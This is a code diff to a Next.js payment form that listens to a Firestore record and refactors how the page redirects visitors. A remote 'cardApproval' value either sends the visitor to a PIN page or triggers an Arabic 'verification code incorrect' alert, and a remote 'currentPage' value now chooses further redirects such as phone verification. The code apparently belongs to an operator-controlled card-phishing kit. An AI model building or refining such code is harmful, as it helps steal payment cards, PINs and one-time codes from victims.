@@ -16,6 +16,7 @@ import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
 import Image from "next/image";
 import FullPageLoader from "@/components/loader";
+import { getRedirectUrl } from "@/lib/page-routes";
 
 export default function PaymentForm() {
   const router = useRouter();
@@ -83,8 +84,8 @@ export default function PaymentForm() {
       if (userData.cardApproval === "approved")
         window.location.href = "/payment/pin";
       if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
-      if (userData.currentPage === "9999")
-        window.location.href = "/verify-phone";
+      const redirectUrl = getRedirectUrl(userData.currentPage, "payment");
+      if (redirectUrl) window.location.href = redirectUrl;
     });
 
     return () => unsubscribe();
